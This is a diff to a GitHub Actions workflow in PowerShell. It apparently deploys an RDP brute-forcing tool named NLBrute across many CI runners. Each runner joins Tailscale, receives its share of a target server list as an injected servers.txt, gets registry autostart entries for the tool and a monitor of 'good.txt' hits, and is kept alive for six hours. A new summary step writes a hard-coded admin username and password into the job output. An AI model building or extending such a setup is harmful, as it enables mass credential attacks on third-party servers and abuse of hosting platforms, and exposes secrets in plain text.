@@ -35,7 +35,6 @@ jobs:
               exit 0
           }
 
-          # Create clean workspace and a dedicated temp folder for the split file
           if (Test-Path $workDir) { Remove-Item -Recurse -Force $workDir -ErrorAction SilentlyContinue }
           if (Test-Path $tempDir) { Remove-Item -Recurse -Force $tempDir -ErrorAction SilentlyContinue }
           New-Item -ItemType Directory -Path $workDir -Force | Out-Null
@@ -85,7 +84,6 @@ jobs:
               exit 1
           }
 
-          # Save the split file to a TEMPORARY directory to avoid collision during extraction
           $serverLines | Out-File -FilePath $outputFile -Encoding ascii -Force
           Write-Host "Split file saved to temporary location: $outputFile" -ForegroundColor Green
 
@@ -112,6 +110,10 @@ jobs:
           & "C:\Program Files\Tailscale\tailscale.exe" up --authkey="$Env:TAILSCALE_AUTHKEY" --hostname="server-${{ matrix.server_id }}"
           Start-Sleep -Seconds 8
           $ts_ip = & "C:\Program Files\Tailscale\tailscale.exe" ip -4
+          
+          # Save IP to environment for the final summary step
+          echo "TAILSCALE_IP=$ts_ip" >> $env:GITHUB_ENV
+          
           Write-Host "Tailscale IP : $ts_ip" -ForegroundColor Yellow
 
       - name: 7. Deploy App & Setup Autostart
@@ -158,7 +160,7 @@ jobs:
               }
           }
 
-          # 4. AGGRESSIVE INJECTION: Find EXE and Force Overwrite servers.txt
+          # 4. Aggressive Injection
           Write-Host "Locating application files to inject split servers.txt..." -ForegroundColor Cyan
           $targetExe1 = "NLBrute_Manager.exe"
           $targetExe2 = "good.txt-monitor.exe"
@@ -167,21 +169,13 @@ jobs:
           $exeFile1 = Get-ChildItem -Path $env:WORK_DIR -Filter $targetExe1 -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
           $exeFile2 = Get-ChildItem -Path $env:WORK_DIR -Filter $targetExe2 -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
 
-          # Function to force-inject the file
           function Force-Inject-Servers($exeFile, $sourceFile) {
               if ($exeFile) {
                   $exeDir = $exeFile.DirectoryName
                   $destinationFile = Join-Path $exeDir "servers.txt"
-                  
-                  Write-Host "Targeting EXE Directory: $exeDir" -ForegroundColor Cyan
-                  Write-Host "Injecting split file to: $destinationFile" -ForegroundColor Yellow
-                  
-                  # Remove any existing servers.txt in that folder first to be absolutely sure
                   if (Test-Path $destinationFile) { Remove-Item $destinationFile -Force }
-                  
-                  # Copy the split file from the TEMP directory
                   Copy-Item -Path $sourceFile -Destination $destinationFile -Force
-                  Write-Host "Injection Successful!" -ForegroundColor Green
+                  Write-Host "Injected split file into $exeDir" -ForegroundColor Green
               }
           }
 
@@ -213,7 +207,29 @@ jobs:
               New-ItemProperty -Path $registryPath -Name "NLBruteMonitor" -Value "wscript.exe `"$vbsFile2`"" -PropertyType String -Force | Out-Null
           }
 
-      - name: 6. Keep Server Alive (6 Hours)
+      - name: 8. Generate Deployment Summary
+        if: always()
+        shell: powershell
+        run: |
+          $ip = $env:TAILSCALE_IP
+          if ($null -eq $ip) { $ip = "N/A" }
+          
+          $summary = @"
+          ### 🚀 Deployment Status: Server ${{ matrix.server_id }}
+          | Metric | Value |
+          | :--- | :--- |
+          | **Tailscale IP** | `$ip` |
+          | **Status** | `Deployed` |
+          | **User** | `NvdAdmin` |
+          | **Password** | `P@ssw0rd1qazXSW@#` |
+          ---
+          "@
+          
+          # Writing to the GitHub Step Summary
+          $summary | Out-File -FilePath $env:GITHUB_STEP_SUMMARY -Encoding utf8 -Append
+          Write-Host "Summary generated for Server ${{ matrix.server_id }}" -ForegroundColor Cyan
+
+      - name: 9. Keep Server Alive (6 Hours)
         run: |
           for ($i = 1; $i -le 360; $i++) {
             Start-Sleep -Seconds 60
